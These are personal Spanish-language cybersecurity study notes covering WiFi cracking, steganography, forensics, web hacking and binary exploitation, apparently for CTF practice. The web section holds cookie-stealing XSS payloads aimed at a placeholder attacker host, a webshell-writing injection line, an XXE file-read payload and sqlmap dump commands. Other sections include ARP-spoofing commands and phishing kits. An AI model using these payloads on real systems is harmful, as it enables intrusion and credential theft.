# Mis Notas de Ciberseguridad
Estas son las notas que he ido cogiendo desde que empecé a aprender sobre hacking ético y ciberseguridad. Quería mover todo del bloq de notas donde las tenía a algo "bonito" porque el archivo a crecido demasiado y también me parecía que podría ser interesante para alguien más.

# Índice

<!-- TOC depthFrom:1 depthTo:6 withLinks:1 updateOnSave:1 orderedList:1 -->

1. [Cosas útiles](#cosas-útiles)
2. [Identificación de frecuencias de radio (Tarjetas NFC)](#identificación-de-frecuencias-de-radio-tarjetas-nfc)
	1. [Dispositivos](#dispositivos)
3. [Redes WIFI](#redes-wifi)
	1. [Algunos conceptos](#algunos-conceptos)
	2. [Ataques](#ataques)
	3. [Herramientas](#herramientas)
4. [SDR (Radio Hacking)](#sdr-radio-hacking)
	1. [Conceptos](#conceptos)
	2. [Fases](#fases)
	3. [Herramientas](#herramientas-1)
5. [Criptología](#criptología)
	1. [Criptografía](#criptografía)
		1. [Tipos](#tipos)
		2. [Herramientas](#herramientas-2)
		3. [Diccionarios](#diccionarios)
		4. [Reglas](#reglas)
	2. [Steganografía](#steganografía)
		1. [Steganografía técnica](#steganografía-técnica)
			1. [Algunos conceptos](#algunos-conceptos-1)
			2. [Técnicas](#técnicas)
			3. [Herramientas varias de steganografía (Cada uno usará su algoritmo)](#herramientas-varias-de-steganografía-cada-uno-usará-su-algoritmo)
			4. [Stegoanálisis](#stegoanálisis)
				1. [Herramientas varias de stegoanalisis](#herramientas-varias-de-stegoanalisis)
				2. [Lecturas recomendadas](#lecturas-recomendadas)
		2. [Steganografía artística](#steganografía-artística)
6. [Forense](#forense)
	1. [Capturas de ram](#capturas-de-ram)
		1. [Volatility](#volatility)
			1. [lsass.exe](#lsassexe)
	2. [Imagen de disco](#imagen-de-disco)
		1. [FTK Imager](#ftk-imager)
7. [Hacking web](#hacking-web)
	1. [Herramientas](#herramientas-3)
	2. [Ataques](#ataques-1)
8. [Ingeniería inversa y exploit de binarios](#ingeniería-inversa-y-exploit-de-binarios)
    1. [Herramientas y comandos](#herramientas-y-comandos)
9. [Metodología de hacking (Pentest)](#metodología-de-hacking-pentest)
	1. [Ciclo de vida de un pentest](#ciclo-de-vida-de-un-pentest)
		1. [Reconocimiento (OSINT o inteligencia de fuentes abiertas)](#reconocimiento-osint-o-inteligencia-de-fuentes-abiertas)
		2. [Escaneo y enumeración](#escaneo-y-enumeración)
		3. [Ganar acceso y escalar privilegios](#ganar-acceso-y-escalar-privilegios)
		4. [Mantener acceso, Cubrir rastro y Reportar](#mantener-acceso-cubrir-rastro-y-reportar)
		
<!-- /TOC -->

# Cosas útiles

- **Generador de reverse shells:** https://www.revshells.com/
- **`[COMAND] 2> /dev/null`:** Para quitar la salida de error y pasar de ella)
- **Algunas VPN y proxies:** freedom vpn, opera vpn, proxy ultrasurf
- Se puede utilizar un *spoofer* para cambiar la información de un dispositivo
- Cuidado con las balizas en los acortadores de ip (redirecciones que hacen que puedan pillarte información). Existen herramientas para desacortar un enlace
- **Logstalgia:** Programita para pasarle un log de conexiones y generar de forma visual las peticiones que hay al sistema
- **Metasploiteable:** Máquina virtual para practicar
- **Pirámide de la seguridad informática (CIA):** Confidencialidad, Integridad, Disponibilidad y no repudio
- **Plataforma Atenea:** Plataforma que contiene una recopilación de muchos CTFs
- **https://ctftime.org/:** Página donde participar en CTFs o ver los write ups de CTFs pasados
- **Foremost:** En Kali contamos con esta herramienta que a partir de las cabeceras, pies de página y las estructuras de datos internas es capaz de recuperar archivos. Puede servir para sacar ficheros de una captura .pcap de forma sencilla
- **Algoritmo DES:** Es un algoritmo de cifrado cuya clave tiene una longitud de 8 bytes (64 bits). Información útil para CTFs
- [**FoxyProxy**](https://addons.mozilla.org/es/firefox/addon/foxyproxy-standard/)**:** Extention to manage proxies easily in Firefox
- **`searchsploit`:** Una base de datos donde buscar diferentes vulnerabilidades
    - Con `-x PATH` podemos imprimir el contenido del archivo adjuntado a una vulnerabilidad (Código o explicación detallada)
    - Con `-m PATH` podemos copiar a nuestro directorio actual el archivo adjuntado a una vulnerabilidad
- Algunas herramientas útiles para hacer phishing:
	- [**GoPhish**](https://github.com/gophish/gophish)
	- [**Evilginx**](https://github.com/kgretzky/evilginx2)
	- [**Zphisher**](https://github.com/htr-tech/zphisher)
	- [**SocialPhish**](https://github.com/xHak9x/SocialPhish)
	- [**Social Engineer Toolkit**](https://github.com/trustedsec/social-engineer-toolkit)
- Para resolver peticiones DNS podemos usar `nslookup` o `dig`
	- Zone transfer con `dig`: `dig axfr example.com @DNS-SERVER-ADDR`
	- Zone transfer con `dig` (Reverse lookup): `dig axfr -x 192.168 @DNS-SERVER-ADDR`
- [**RouterSploit**](https://github.com/threat9/routersploit)**:** Un framework para la explotación de dispositivos embebidos
- [**PacketWhisper**](https://github.com/TryCatchHCF/PacketWhisper)**:** Para exfiltrar información usando DNS
- [**Updog**](https://github.com/sc0tfree/updog)**:** Alternativa al `SimpleHTTPServer` de Python que además permite también subir archivos
- [**Olevba**](https://github.com/decalage2/oletools/wiki/olevba)**:** Script para buscar macros en documentos office
- En redes con switches necesitaremos hacer ARP poisoning para poder hacer sniff de paquetes (Man in the middle):
```console
# https://www.kali.org/tools/dsniff/
echo 1 > /proc/sys/net/ipv4/ip_forward # Activa la redirección de paquetes en el kernel de Linux para evitar problemas de comunicación entre las víctimas
arpspoof -i eht0 -t <VICTIM_IP_A> -r <VICTIM_IP_B>
```
- Con `python3 -m http.server 8080` podemos montar un servidor web en el puerto 8080
- Si necesitamos un servidor php para hacer pruebas o lo que sea, podemos montarlo rapidamente con `php -S 127.0.0.1:8080` en el puerto 8080
- Para conectarnos con RDP a una máquina en Kali podemos hacer: `xfreerdp /u:USER /p:PASSWORD /v:IP /dynamic-resolution`
- Para analizar archivos de office en busca de macros se puede utilizar: [Oledump](https://blog.didierstevens.com/programs/oledump-py/)
- Para determinar si una imagen ha sido editada (mejor si es un formato con pérdida) se puede usar [Forensically](https://29a.ch/photo-forensics/#error-level-analysis)

# Identificación de frecuencias de radio (Tarjetas NFC)
Trabajan a 125 khz o 13.56 Mhz. Se puede leer la información de una tarjeta de pago, existe una app de android con la que podemos hacerlo fácilmente: https://github.com/devnied/EMV-NFC-Paycard-Enrollment

## Dispositivos
- **Proxmark3:** Sirve para leer y copiar tarjetas
	- Dos antenas, para 125 khz y 13.56 Mhz
	- Modo standalone o modo conectado
	- Existen dos firmwares: Oficial y Iceman (Para hacer ataques de fuerza bruta a tarjetas sin clave por defecto)
	- Lo que te bajas tiene varios BAT para hacer las cosas, para flashear el firmware pues miramos que puerto com tenemos la proxmark y lo cambiamos en el fichero BAT (Todos asi)

# Redes WIFI
## Algunos conceptos
- **Beacon Frames**: El móvil va preguntando si esta disp alguna de las redes a las que se ha conectado a vces. Si alguien esta snifeando, podria hacer un "gemelo" de la red
- **Modo promiscuo o Modo monitor**: Nuestra tarjeta de red o WIFI debe permitirlo para poder snifear la red

## Ataques
- **Jamming:** Atacar la señal (inhibidor) Hay jammers reactivos, randoms, constantes.
- **Deauth de usuarios:** No es un jammer
- **Redes Públicas:** Cuidado porque no sabes quien hay detrás 
- **Portal cautivo:**
	- Lo tipico de los hoteles. Lo facil seria spofeando la mac por la de alguien conectado
	- Iodine (tunel DNS) o dns2tcp podemos saltar el portal
- **WEB (ChopChop):**
	- Detectamos primer bloque de un paquete ARP
	- Tomamos el ultimo byte cifrado y se prueban combinaciones para determinar como se calcula el ICV (Vector inicialización o check de integridad)
	- La idea es tomar muchos ICVs para poder ir descartando y sacar la clave
	- Al final se descifra el byte. Así con todos
- **WPS (Pixie Dust):**
	- Al ser un pin de 8 digitos se puede descifrar por fuerza bruta
- **WPA:** 
	- Se captura el tercer paquete del four  way handshake (instalación). Este paquete se puede reenviar lo que nos dé la gana y por tanto descifrar el paquete
	- Bettercap 2 + hcxtools: bettercap --iface nombreInterfaz a utilizar para sniffear
		- Ataque:
		1. wifi.recon on
		2. Nos limitamos a mirar solo un canal para reducir el ruido (wifi.recon.channel 6)
		3. Con bettercap podemos hacer ataques de deautentificación a un AP (wifi.deauth macRouter). Lo hacemos para forzar a un dispositivo a reconectarse
		4. Se captura el WPA2 handshake (hcxdumptool puede sacar el psk aunque tambien podemos crackear el paquete que hemos capturado)
		5. Con lo capturado pues crackeamos con hashcat para sacar el PSK (clave del router) a partir del PMK
		6. Para no tener que esperar a un cliente para robar el handsake nos podemos asociar a un AP (No hace falta saber clave)
		7. wifi.assoc all (Sacamos el PKMID el cual es un hash que se genera hasheando una cadena fija + mac de cliente + AP usando de contraseña el PSK)
- **Suplantación:** Hacer pensar que te conectas a un sitio pero no. Herramienta: hostapd y dnsmask (esto para el tema dns y dhcp) / wifiphisher, evil engines 2
- **Phising (2FA):** Haciendo que meta el codigo del sms tambien en la web al robar credenciales
		
## Herramientas
- **bettercap:** Analizador de redes. Tiene algunas funcionalidades más avanzadas de las que tiene Wireshark
- [**Wireshark**](https://www.wireshark.org/)**:** Analizador de protocolos de red más usado. Permite de forma sencilla revisar y filtrar todos los paquetes que circulan por una red
- Esto para ondas comunes viene bien (Diccionario):
	- **hcxdumptool:** Lo que hace es monitorizar paquetes que vayan saliendo para ver si son vulnerables y saca el PSK
	- **hcxpcaptool:** Lo mismo que el otro pero sacando el PMKID
- **cap2hccapx:** Cambio de formato de captura a hashcat
- **hashcat:** Usa varios ataques de fuerza bruta (Comando para esto: hashcat -m2500 (Para PMK) (-m16800 para PKMID) -a3 -w3 file)

# SDR (Radio Hacking):
Radio en la cual alguna o varias de las funciones de la capa física son definidas mediante software: filtros, mezcladores, amplificadores...

## Conceptos
- **Onda corta:** HF

## Fases
- **Muestreo**
- **Cuantificación**
- **Codificación de la señal**

## Herramientas
- **Virtual cable:** Para pasar a un programa de SDR desde tarjeta sonido
- **CW Skimmer:** Decodificador y analizador de ondas
- [**rtl_433**](https://github.com/merbanan/rtl_433)
- [**minimodem**](https://github.com/kamalmostafa/minimodem)
- **pyModeS:** Para decodificar los mensajes ADS-B (Los de los aviones)

# Criptología

## Criptografía
Ámbito de la criptología que se ocupa de las técnicas de cifrado o codificado destinadas a alterar las representaciones lingüísticas de ciertos mensajes con el fin de hacerlos ininteligibles a receptores no autorizados. El criptoanálisis sería la ciencia que sería romper los códigos seguros y revelar las información

### Tipos
- **Clásica:**
	- **Sustitución:** Reemplazar elementos del texto por otros
	- **Trasposición:** Desplazar elementos del texto
	- **Mixtos:** Combinación de los anteriores
- **Moderna:** 
	- **Clave simétrica:**
		- **En Serie:** Registros de desplazamiento que se mueven y se realimentan a nivel de bit
		- **En Bloque:** El texto se agrupa en bloques, se cifran con una clave y se optiene el texto cifrado. Hay que elegir como combinar los bloques
	- **Clave asimétrica:**
		- **Clave Pública y Privada**

### Herramientas
- **CrackStation o Google:** Para "revertir" un determinado hash común
- **hashid:** Identifica un hash
- **hashcat:** Usa varios ataques de fuerza bruta
- [**colabcat**](https://github.com/someshkar/colabcat)**:** Ejecuta hashcat en Google Colab
- [**Hydra**](https://github.com/vanhauser-thc/thc-hydra)**:** Permite realizar diferentes tipos de fuerza bruta ([Cheatsheet](https://github.com/frizb/Hydra-Cheatsheet))
- **filemyhash:** Programa para descifrar un hash (base de datos)
- **hashidentifier:** Programa para identificar tipo de hash
- **dcode.fr:** Página para codificar y decodificar diferentes tipos de algoritmos de cifrado
- **CyberChef:** Se puede ir metiendo una receta de decodificación (tanto cifrado como codificación)
- [**John the Ripper**](https://github.com/openwall/john)**:** Permite crackear un montón de tipos de contraseñas. También permite generar diccionarios mediante mutaciones usando las reglas de `/etc/john/john.conf` y usando `john --wordlist=DICCIONARIO_ORIGEN --rules --stdout > OUTPUT.txt`
- **fcrackzip:** Para intentar crackear la información de un zip. Ejemplo: `fcrackzip -b --method 2 -D -p /usr/share/wordlists/rockyou.txt -v ./file.zip`
- **OpenSSL:** Paquete de herramientas de administración y bibliotecas relacionadas con la criptografía

### Diccionarios
Para crackear contraseñas necesitaremos diccionarios, aquí dejo algunas opciones:
- **Localización de algunos en Kali:** `/usr/share/di*`, `/usr/share/wordlist`, `/usr/share/ncrack`
- [**Rockyou**](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)**:** Un diccionario bastante utilizado
- [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
- **Crunch y Cewl:** Para creación de diccionarios
- [**Mentalist**](https://github.com/sc0tfree/mentalist)**:** Herramienta gráfica para la generación de diccionarios
- [**RSMangler**](https://github.com/digininja/RSMangler)**:** Permite generar diccionarios a partir de un conjunto de palabras

### Reglas
Si se combina un buen diccionario con un buen conjunto de reglas las posibilidades de éxito aumentan:
- [**OneRuleToRuleThemAll**](https://github.com/NotSoSecure/password_cracking_rules)

## Steganografía
Técnicas de ocultación de información. Utilizar vídeos, imágenes o lo que sea como portadores de información

### Steganografía técnica

#### Algunos conceptos
- **Archivos Políglotas:** Permitir meter junto a por ejemplo una imagen código extra que se ejecute al abrirla
- **Entropía:** Mide el nivel de desorden de la información de un fichero. Una entropia alta (se puede calcular con `ent`) podría indicar info codificada o cifrada, lo cual puede ser malware, stego... **Ojo!** en la steganografia puede llevar a confusión, la entropía puede no variar de forma llamativa y además algunos algoritmos de steganografía o incluso programas comunes comprimen el archivo haciendo que tengan incluso menos entropía.
- **Existen:** Comprobadores de integridad de ficheros, sistemas antivirus, software analisis forense, herramientas de estegoanalisis para comprobar los ficheros

#### Técnicas
- **EoF:** Añadir información al final de un fichero con estructura. Si metes un zip al final de una imagen puedes hacer unzip
a la imagen para sacar lo que haya comprimido en el zip
- **LSB (Least significant bit):** Es muy común en imágenes y vídeo. Básicamente, es coger el bit menos significativo de la codificación RGB de cada pixel y cambiarlo. Podemos meter información en una imagen así sin que realmente afecte demasiado a los colores. Un método para extraer la información sería a traves de python con la librería Pillow u OpenCV recorriendo pixel a pixel y sacando grupos de bytes con los bits menos significativos de cada pixel.

#### Herramientas varias de steganografía (Cada uno usará su algoritmo)
- **Editores de imagenes**
- **Outguess**
- **Steghide:** Muy utilizada, permite embeber archivos en otros cifrando la info si queremos. Usa LSB junto a teoría de grafos para maximizar el uso de los datos del archivo original.
- **OpenStego:** Permite embeber archivos en otros como la anterior pero con interfaz. Tambien meter watermark (trabaja con .bmp)
- **StegoSuite**
- **Jsteg**
- **Stegano**
- **LSBSteg**
- **F5**
- **DeepSound**
¿Problemas de las herramientas de arriba? ¡Son comunes! Es mejor usar algoritmos propios.

#### Stegoanálisis
Ciencia o arte que permite detectar información oculta:
1. Detectar información ocultada en el stegomedio sospechoso. Fuerza bruta sobre algoritmos comunes por ejemplo
stegcracker: Fuerza bruta sobre al algoritmo de Steghide
2. Estimación del tamaño de la información ocultada
3. Estracción y recuperación de la información enmascarada

##### Herramientas varias de stegoanalisis
- Comando `file` para ver cabecera fichero, `strings` para ver si hay texto legible
- **exiftool:** Ver tipo fichero metadatos blabla
- **ghex:** Editor hexadecimal
- **xxd:** Para leer información hexadecimal
- **BinWalk:** Con `-e` para sacar archivos ocultos de otro. Si solo lo lanzamos contra un fichero saca información del mismo (Por ejemplo si hay algún archivo oculto)
- **StegoVeritas**
- **Zsteg**
- **StegDetect:** Busca exploits conocidos
- **Jsteg**
- **Foremost**
- **Ffmpeg**
- **Imagen de docker stego-toolkit** Incluye todas las herramientas de esta sección. Tiene además 2 scripts (*check_jpg.sh* y *check_png.sh*) que automatizan el lanzar varias herramientas de análisis de stego

##### Lecturas recomendadas
- **Criptored de la UPM**
- **Esteganografia y Estegoanálisis**
- **Esteganografia  y canales encubiertos** - Por Dr. Alfonso Muñoz
- **StegoSploit**

### Steganografía artística

- **Videojuegos:**
	- **Casos de uso:** Jugar a otro videojuego o introducir datos en un videojuego
	- **Contramedidas y detección (Stegoanálisis):** Se buscan desviaciones en la duración de partidas, nivel de juego y el resultado del mismo
	- **Herramientas:** 
		- **ChessSteganography:** Utiliza los movimientos de ajedrez para codificar un mensaje
		- **Hammer:** Herramienta de edición de mapas. Otro podría ser https://www.mipui.net/
		- **stego-toolkit:** Metaherramienta en forma de imagen de Docker que contiene muchas otras herramientas populares instaladas
		- **Steganography Tools:** Listado con herramientas de esteganografía
- **Imagen digital:**
	- **Casos de uso:** LSB, ocultar información mediante paleta de colores, ocultar información mediante coeficientes y ocultar información mediante la transformada de ondícula (wavelet)
	- **Contramedidas y detección (Stegoanálisis):** Histograma, ataques visuales y estadísticos, detección basada en la firma y basada en el hash y detección basada en el aprendizaje automático.
	- **Herramientas:** 
		- **GIMP:** Editor de imagenes
		- [**StegSolve**](https://github.com/zardus/ctf-tools/blob/master/stegsolve/install)**:** Herramienta muy útil para aplicar filtros a imágenes y analizarlas
		- **StegoSuite:** Herramienta libre steganografía en Java
		- **StegOnline:** Combina y mejora características de otras herramientas
		- **stego-toolkil**
		- **Steganography Software:** Repositorio histórico de diversas herramientas
		- **Steghide:** Programa de esteganografía que puede ocultar datos en varios tipos de archivos
		- **Steganography Tools**
	- **Ejemplo:**
		- **Estereopgramas:** Son imágenes hechas de tal forma que permiten generar cosas en 3D
- **Audio digital:**
	- **Casos de uso:** LSB, ocultar información mediante el eco, fase de la señal, codificación de paridad y difusión del espectro (espectrograma)
	- **Contramedidas y detección (Stegoanálisis):** Se suele estracción de características y aprendizaje automático
	- **Herramientas:** 
		- **Sonic Visualizer**
		- **Audacity**
		- **Spectrum Analyzer**
		- **DeepSound**
		- **Wav Steg**
		- **stego-toolkit**
		- **OpenPuff**
		- **Spectrology**
		- **Steghide**
		- **Steganography Tools**
- **Video digital:**
	- **Casos de uso:** LSB, detectar el borde, transformada discreta del coseno (DCT), EoF y metadatos
	- **Contramedidas y detección (Stegoanálisis):** RST (Rotación, Escalado y Translacin), compresión, cambio en la velocidad del fotograma y añadir, intercambiar o borrar fotograma
	- **Herramientas:** 
		- **MSU Stego Video:** Ocultar cualquier fichero en un video
		- **StegoStick:** Esconder cualquier cosa multimedia en otro archivo (audio, imagen, video, pdf...)
		- **OpenPuff**
		- **Steganography Tools**

# Forense

## Capturas de ram

### Volatility 
Herramienta para analizar capturas de RAM. Algunos ejemplos de uso:
```console
Anthares101@kali:~$ volatility -f IMAGEN imageinfo #Saca el SO de la captura de RAM
Anthares101@kali:~$ volatility -f IMAGEN --profile=PERFIL pstree #Saca el arbol de procesos en RAM
Anthares101@kali:~$ volatility -f IMAGEN --profile=PERFIL netscan #Escanea buscando artefactos de red
Anthares101@kali:~$ volatility -f IMAGEN --profile=PERFIL cmdscan #Saca del proceso cmd el historial de comandos usados
Anthares101@kali:~$ volatility -f IMAGEN --profile=PERFIL memdump -p PID -D DIRECTORIO_DESTINO #Dumpea un determinado proceso
```
El proceso dumpeado podemos procesarlo con WINDBG o strings: `strings FICHERO > salida.txt` que saca las cadenas legibles. Por defecto usa 8bits UTF8, con -el se puede cambiar a UTF16 (16 bits):
```console
Anthares101@kali:~$ strings -td -a FILE.dmp
Anthares101@kali:~$ strings -td -el -a FILE.dmp
```
#### lsass.exe
Proceso de seguridad de windows, realiza la autentificación. Si está en memoria este proceso se podría ejecutar lo siguiente para mirar el proceso y sacar los hash de las contraseñas de los usuarios:
```console
Anthares101@kali:~$ volatility -f imagen --profile=PERFIL hashdump
```
En versiones antiguas de Windows (O en las modernas si está activo) se hashea las contraseñas con un hash tipo LM. Funciona tomando una contraseña, la parte por la mitad y hashea las partes por separado.

Si no hay contraseña, Windows tiene un tipo de hash por defecto que indica que una cadena esta vacía. Las contraseñas de Windows que se hashean así son como máximo de 14 caracteres (Se usa padding con caractéres nulos para llegar a 14 si es necesario). En el hash, una contraseña de 7 caracteres aparecería como el segundo hash, como que se rellenan al revés.

Podemos usar por ejemplo [CrackStation](https://crackstation.net/) para intentar revertir hash de Windows comunes.
	
## Imagen de disco

### FTK Imager 

Sirve para montar imagenes de disco en modo lectura: `File/Add evidencee`, `item/Add image file` y le damos a finish. 

Si se quiere sacar un historial de TOR (y no está en RAM) montamos el disco y buscamos la carpeta. TOR no guarda el historial aunque esté basado en Firefox y tenga los ficheros sqlite de bases de datos (`TOR/Data/Browser/`) **pero** si que almacena los iconos de las paginas por las que navegas y su URL asociada (Creo que es el archivo favicons.sqlite o algo asi). Con sqlite browser podemos abrir este tipo de fihero.

Si se quiere ver si se ha comunicado mediante email con alguien y se ha intentado borrar pruebas (no hay nada en RAM) volveremos a la imagen de disco. Si no se encuentra instalado, da un poco igual porque en Appdata se guardan los datos de todos ls programas que se han usado en Windows. Si utilizó thunderbird, en la carpeta `profiles/profile/Mail/LocalFolders/message.mbox`, podemos encontrar el correo electronico si el usuario no se ha preocupado de borrarla manualmente.

Para sacar una contraseña de un gestor de contraseñas (no está en ram), como por ejemplo Keypass, primero hay que buscar la base de datos de las contraseñas, que en este programa esta en `Documents/password.kdbx`. Podemos usar `keypass2jhon.py` para sacar los hashes de la base de datos de keypass. Ahora se limpia lo de `password` que aparece en el fichero generado y se pasa el hash por hashcat:
```console
Anthares101@kali:~$ hashcat -m 13400 -a 0 -w 1 fichero diccionario --force --show #13400 es el tipo de keypass
```

# Hacking web

## Herramientas

- Debugguer y la consola de los navegadores para desofuscar codigo y ejecutar funciones. También se puede mirar la red para mirar las peticiones (lo que se manda y recibe) para sacar información
- Se puede utilizar curl para modificar las cabeceras que se mandan a una web:
	- **`-X`:** Cambia tipo de petición
	- **`-v`:** Más información en la salida del comando
	- **`-H`:** Para editar cabeceras: `User-Agent: kali`
- **Burpsuite:** Captura todas las peticiones del navegador y permite su edicion. El módulo repeater permite ir mandando y recibiendo cabeceras como si fuesemos el navegador vaya (las que queramos)
- **OWASP ZAP:** Escáner de seguridad web
- [**Nikto**](https://github.com/sullo/nikto)**:** Escaner de vulnerabilidades web
- **WebShells:** Implementación basada en web del concepto de shell. [Example](https://github.com/flozz/p0wny-shell)
- **ReverseShells:** El objetivo realiza la conexión e inicia una `shell` mientras el atacante escucha para despues obtener acceso a dicha `shell`
- Para sacar todos los directorios de una web podemos usar [gobuster](https://github.com/OJ/gobuster) o OWASP DirBuster. Con gobuster podemos incluso buscar ficheros accesibles con el parámetro `-x` seguido de las extensiones de ficheros a buscar
- Si encuentras un `.git` en una web BÁJALO. [GitTools](https://github.com/internetwache/GitTools) tiene cositas interesantes para trabajar con repos (Como bajarlos de una web)
- [**CeWL**](https://github.com/digininja/CeWL)**:** Generador de diccionarios personalizados. Analiza una URL especifica con una determinada profundidad y genera un diccionario con las palabras que considera relevantes
- [**Wfuzz**](https://github.com/xmendez/wfuzz)**:** Facilita el fuzzing web
- [**Feroxbuster**](https://github.com/epi052/feroxbuster)**:** Enumerador de directorios recursivo y que ademas facilita entre otras cosas encontrar archivos de backup
- [**EyeWitness**](https://github.com/FortyNorthSecurity/EyeWitness)**:** Diseñado para tomar capturas de los sitios webs especificados, proveer información de las cabeceras del servidor e intentar identificar si se estan utilizando credenciales por defecto en aplicaciones conocidas

## Ataques

- **Cross-site scripting:** Inyección de código Javascript malicioso en una página:
	- Un payload bastante silencioso (no hace ninguna redirección) sería usando AJAX: `<script>let request = new XMLHttpRequest();request.open('GET', 'atackerSite?'+document.cookie, true);request.send();</script>`
	- Otro payload: `<script>new Image().src = 'atackerSite/flag.php?'+document.cookie;</script>`
	- Como apunte final, para escuchar las peticiones hay varias opciones:
		- **`nc`:** Para esto pues recomiendo hacer : `while [ 1 -eq 1 ]; do sudo nc -lnvp 80; done` porque después de cada petición se cierra
		- Con el comando `sudo python3 -m http.server 80` podeis montar un servidor web en la raíz en el directorio donde estéis
		- Otra opción es usar https://hookbin.com/. Podreis crear endpoints y monitorizar las peticiones (Es el más simple de todos vaya)
- **Inclusión de archivos remotos:** Se utiliza en la url el parámetro `page` para ver de que pagina se hace el include y que se cargue un archivo de otro sitio. Se puede ejecutar un `webshell` para controlar y ver todo lo que hay en el server
- **Ataques de inclusión de ficheros locales:** Incluir dentro de la pagina web un fichero local, sitios de plantillas o descargas expuestos. Por ejemplo, cuando se pasa por url el fichero que se quiere utilizar para algo. Si no se acota a lo que puede acceder el servidor web, se puede acceder a archivos del propio Linux o Windows donde esta alojada la pagina. En servidores web `PHP` con esta vulnerabilidad, se puede utilizar `php://filter/convert.base64-encode/resource=PATH_TO_FILE` para poder extraer ficheros con la extensión `php` sin que se ejecuten. También si hay logs del servidor web se podrían llegar a aprovechar para obtener RCE manipulando nuestras peticiones
- **Falsificación de solicitudes del lado del servidor:** La falsificación de solicitudes del lado del servidor (también conocida como SSRF en inglés) es una vulnerabilidad de seguridad web que permite a un atacante inducir a la aplicación del lado del servidor a realizar solicitudes HTTP a un dominio arbitrario de su elección. En los ejemplos típicos de SSRF, el atacante puede hacer que el servidor establezca una conexión con él mismo o con otros servicios basados ​​en web dentro de la infraestructura de la organización, o con sistemas externos de terceros. Los dominios como `localtest.me` son realmente útiles porque resuelven todos sus subdominios a `127.0.0.1` y pueden ayudar a saltarse filtros
- **Sql injection:** Existe un tipo de sql injection que es a ciegas. Es decir, los errores de la base de datos o la info no sale por pantalla y es necesario usar logica binaria (true / false) y poner que si un usuario existe, esperar x segundos. `sqlmap` automatiza todo esto (Algunas cheat sheets: [sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list) y [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)):
```console
Anthares101@kali:~$ sqlmap -u URL --headers "Cookie: ..."
# --dump-all Dumpea todas las tablas de todas las bases de datos
# En vez de -u a mi me gusta utilizar la opción -r para especificar el objetivo

Anthares101@kali:~$ sqlmap --batch --dbs -r post_request.txt
# Con --dbs sqlmap saca todas las bases de datos del sistema
# Con la opción -r se puede especificar un ejemplo de POST a la página y que sqlmap haga lo suyo
# La opción --batch hace que no tengamos que interactuar en el proceso (Selecciona todo por defecto)

Anthares101@kali:~$ sqlmap --current-db --batch -r post_request.txt
# Saca el nombre de la base de datos actual

Anthares101@kali:~$ sqlmap -D DB --tables --batch -r post_request.txt
# Extrae todas las tablas de una determinada base de datos

Anthares101@kali:~$ sqlmap -D DB -T TABLA --columns -r post_request.txt
# Extrae información de las columnas de una determinada tabla

Anthares101@kali:~$ sqlmap -D DB -T TABLA --dump --batch -r post_request.txt
# Hace una copia de toda la información de una determinada tabla de una determinada base de datos

Anthares101@kali:~$ sqlmap -D DB --sql-query "select id,password,...,... from TABLA where COLUMNA like PATRÓN" -r post_request.txt
# Permite extraer los resultados de una query especifica a una tabla conocida

# El parámetro --tamper=space2comment permite intentar saltarse ciertos firewalls (WAF)
```
- **RCE (Ejecución de comandos remotos):** En principio, si se esta poniendo el código directamente: `shell_exec('ping 8.8.8.8');` siendo la ip lo que el usuario mete, si en vez de eso ponemos `;ls` pues aunque `ping` de error ejecuta el comando `ls`. Una vez detectada la vulnerabilidad podriamos ejecutar una WebShell: `;echo'<?php echo shell_exec(s_GET["cmd"]); ?>' > shell1.php`. Si nos vamos a `shell1.php`, con el parámetro de la url `cmd` podremos ejecutar los comandos que nos dé la gana
- **XXE (XML External Entity):** Abusa las características de XML para interactuar con el backend de una aplicación y leer por ejemplo ficheros del sistema. Un payload podría ser:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```
- **Metodologia OWASP para testear seguridad en la web:** OWASP broken web application (Para practicar a atacar paginas y esas cosas) 

# Ingeniería inversa y exploit de binarios
En esta sección quiero recoger 

- Decompiladores: Revierte binarios a lenguajes de alto nivel como C
- Desambladores: Revierte binarios a lenguaje ensamblador
- Debuggers: Permiten ver y cambiar el estado de un programa en ejecución

## Herramientas y comandos
- **GDB:** Uso básico ([cheatsheet](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)):
```console
$ gdb binary
(gdb)> set disassembly-flavor intel # Para que el formato de lo siguiente sea mas bonito
(gdb)> disassemble main # Saca las instrucciones realizadas en la función main
(gdb)> break *main # Coloca un breakpoint al principio de main
(gdb)> run [arguments if the program need them]
(gdb)> info registers # Estamos parados en el breakpoint de antes y podemos mirar que hay en los registros en ese punto
(gdb)> ni # Siguiente instrucción (Si despues de este comando pulsamos intro podemos ir pasando de instrucción sin tener que escribirlo again)
(gdb)> continue # Continua la ejecución hasta el proximo breakpoint o el final del mismo
(gdb)> $eax=0 # Da al registro eax el valor 0 (Esto se puede hacer con cualquier registro)
(gdb)> x/s mem_dir # Imprime lo que hay en una determinada dirección de memoria
(gdb)> p variable # Imprime el valor de una variable (El binario debe estar compilado en modo debug)
```
- [**peda**](https://github.com/longld/peda)**:** Asistente hecho en Python para el desarrollo de exploits en GDB
- **Ghidra:** Herramienta de ingeniería inversa gratuita
- **`objdump`:** 
```console
$ objdump -d binary # Desensambla el binario e imprime las instrucciones
$ objdump -x binary # Información sobre el binario
```
- **`strace binary`:** Muestra las llamadas al sistema que se realizan en un binario
- **`ltrace binary`:** Muestra las llamadas a funciones de librerias que se realizan en un binario
- **`dmesg`:** Útil para comprobar errores de desbordamiento
- [**pwntools**](https://github.com/Gallopsled/pwntools)**:** Es un framework para CTF y también una librería para desarrollar exploits
    - **`pwn checksec`:** Muy últil para comprobar que tipo de seguridad tiene un binario activada
    - Para generar shellcode que ejecute el comando `sh` se puede hacer esto:
    ```python
    from pwn import *

    # Es necesario especificar el contexto del binario:
    context.binary = './binary' # Asi se especifica el contexto de forma automática
	context.update(arch='i386', os='linux') # Asi se especifica el contecto a mano

    payload = asm(shellcraft.sh())
	payload += asm(shellcraft.exit())
    ```
- **Radare:** Uso básico:
    - Ejecutamos radare de la siguiente forma `radare2 binario`
    - Lo primero sería hacer `aa` parar analizar el binario y despues podriamos utilizar `afl` para mostrar todas las funciones encontradas
    - En este punto podemos poner `pdf@main` por ejemplo para desensamblar la función `main` (Esto se puede hacer con cualquier función)
